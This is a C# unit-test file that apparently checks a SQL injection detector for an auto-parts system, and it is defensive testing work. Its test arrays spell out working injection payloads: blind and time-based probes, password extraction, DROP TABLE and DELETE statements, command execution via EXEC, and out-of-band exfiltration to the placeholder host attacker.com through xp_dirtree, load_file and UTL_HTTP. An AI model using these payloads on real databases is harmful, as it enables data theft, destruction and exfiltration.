using FluentAssertions;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using SqlInjectDetect;

namespace SqlInjectDetectTests;

[TestClass]
public sealed class SqlInjectDetectorAdvancedAttackTests
{
    [TestMethod]
    public void ContainsSqlInjection_SubtleInjectionAttempts_ReturnsTrue()
    {
        // Arrange - More subtle injection attempts that might be tried on part data
        var subtleInjections = new[]
        {
            "Part Name' + (SELECT TOP 1 password FROM users) + '",
            "Filter'; IF (1=1) SELECT * FROM sensitive_data; --",
            "Engine' + CHAR(39) + 'Block",
            "Brake Pad' + SPACE(1) + 'Set'; DROP TABLE inventory; --",
            "Oil' + CHAR(32) + 'Filter'; UPDATE prices SET cost=0; --",
            "Spark' || ' Plug'; DELETE FROM users; --",
            "Air Filter' HAVING 1=1; --",
            "Battery' GROUP BY part_id HAVING COUNT(*) > 0; --",
            "Tire' ORDER BY 1; DROP TABLE parts; --",
            "Alternator'; DECLARE @cmd VARCHAR(8000); SET @cmd = 'dir'; EXEC(@cmd); --",
            "Radiator' ESCAPE CHAR(92); --",
            "Transmission' LIKE '%admin%'; --"
        };

        // Act & Assert
        foreach (var injection in subtleInjections)
        {
            SqlInjectDetector.ContainsSqlInjection(injection).Should().BeTrue(
                $"Subtle injection '{injection}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_EncodedInjectionAttempts_ReturnsTrue()
    {
        // Arrange - Various encoding attempts to bypass detection
        var encodedInjections = new[]
        {
            "Part%27%20OR%20%271%27%3D%271", // URL encoded ' OR '1'='1
            "Filter' + 0x53454C454354", // Hex encoded SELECT
            "Engine' + CAST(0x44524F50 AS VARCHAR)", // Hex encoded DROP
            "Brake' + CONVERT(VARCHAR, 0x5441424C45)", // Hex encoded TABLE
            "Oil 0x756e696f6e select", // Hex encoded "union select"
            "Spark' + CHAR(85) + CHAR(78) + CHAR(73) + CHAR(79) + CHAR(78)", // CHAR encoded UNION
            "Air' + ASCII('S') + 'ELECT'", // ASCII encoding attempt
            "Battery' + NCHAR(85) + NCHAR(78) + NCHAR(73) + NCHAR(79) + NCHAR(78)", // NCHAR encoded
            "Tire' + SUBSTRING('XSELECTX', 2, 6)", // Hidden SELECT in substring
            "Alternator' + REVERSE('TCELES')", // Reversed SELECT
            "Part' + REPLACE('xDROPx', 'x', '')", // Hidden DROP with REPLACE
            "Filter' + STUFF('xDELETEx', 2, 6, 'DELETE')" // STUFF function to build DELETE
        };

        // Act & Assert
        foreach (var injection in encodedInjections)
        {
            SqlInjectDetector.ContainsSqlInjection(injection).Should().BeTrue(
                $"Encoded injection '{injection}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_BlindInjectionAttempts_ReturnsTrue()
    {
        // Arrange - Blind SQL injection attempts commonly used in part searches
        var blindInjections = new[]
        {
            "Filter' AND (SELECT SUBSTRING(@@version,1,1)) = '5'; --",
            "Part' AND (SELECT COUNT(*) FROM information_schema.tables) > 10; --",
            "Engine' AND (SELECT LEN(password) FROM users WHERE id=1) > 5; --",
            "Brake' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)) > 65; --",
            "Oil' AND (SELECT name FROM master..sysdatabases WHERE dbid=1) = 'master'; --",
            "Spark' AND @@VERSION LIKE '%Microsoft%'; --",
            "Air' AND (SELECT system_user) = 'sa'; --",
            "Battery' AND (SELECT db_name()) = 'inventory'; --",
            "Tire' AND (SELECT user_name()) LIKE '%admin%'; --",
            "Alternator' AND (SELECT @@SERVERNAME) LIKE '%PROD%'; --",
            "Radiator' AND (SELECT host_name()) = 'SERVER01'; --",
            "Transmission' AND DATALENGTH(password) > 8; --"
        };

        // Act & Assert
        foreach (var injection in blindInjections)
        {
            SqlInjectDetector.ContainsSqlInjection(injection).Should().BeTrue(
                $"Blind injection '{injection}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_TimeBasedInjectionAttempts_ReturnsTrue()
    {
        // Arrange - Time-based injection attempts
        var timeBasedInjections = new[]
        {
            "Part'; WAITFOR DELAY '0:0:5'; --",
            "Filter'; IF (1=1) WAITFOR DELAY '0:0:10'; --",
            "Engine' AND (SELECT COUNT(*) FROM users) > 0; WAITFOR DELAY '0:0:3'; --",
            "Brake'; WHILE 1=1 BEGIN WAITFOR DELAY '0:0:1'; BREAK; END; --",
            "Oil' OR (SELECT 1 WHERE ASCII(SUBSTRING(@@version,1,1)) = 77); WAITFOR DELAY '0:0:5'; --",
            "Spark'; BEGIN TRY; WAITFOR DELAY '0:0:5'; END TRY BEGIN CATCH; END CATCH; --",
            "Air' + (CASE WHEN (1=1) THEN 'true' ELSE (SELECT 1 UNION SELECT 2) END); --",
            "Battery'; IF @@VERSION LIKE '%Microsoft%' WAITFOR DELAY '0:0:5'; --"
        };

        // Act & Assert
        foreach (var injection in timeBasedInjections)
        {
            SqlInjectDetector.ContainsSqlInjection(injection).Should().BeTrue(
                $"Time-based injection '{injection}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_ErrorBasedAttacks_ReturnsTrue()
    {
        // Arrange
        var errorBasedAttacks = new[]
        {
            "' AND 1=CONVERT(int, @@version)--",
            "' OR 1=1/(SELECT 0)",
            "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT @@version), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
            "' OR 1 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(112)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))+CHAR(113)+CHAR(122)+CHAR(112)+CHAR(120)+CHAR(113)))"
        };

        // Act & Assert
        foreach (var attack in errorBasedAttacks)
        {
            SqlInjectDetector.ContainsSqlInjection(attack).Should().BeTrue($"Error-based attack '{attack}' should be detected");
        }
    }

    [TestMethod]
    public void ContainsSqlInjection_OutOfBandAttacks_ReturnsTrue()
    {
        // Arrange
        var outOfBandAttacks = new[]
        {
            "' OR 1=1; EXEC master..xp_dirtree '//attacker.com/share'; --",
            "' OR (SELECT load_file('\\\\attacker.com\\share\\test.txt'))",
            "' AND 1=UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT user FROM DUAL)) --",
            "' OR 1=1; DECLARE @p VARCHAR(1024); SELECT @p = (SELECT CONVERT(varchar(255), @@version)); EXEC('master..xp_dirtree ''\\\\' + @p + '.attacker.com\\foo'''); --"
        };

        // Act & Assert
        foreach (var attack in outOfBandAttacks)
        {
            SqlInjectDetector.ContainsSqlInjection(attack).Should().BeTrue($"Out-of-band attack '{attack}' should be detected");
        }
    }
}
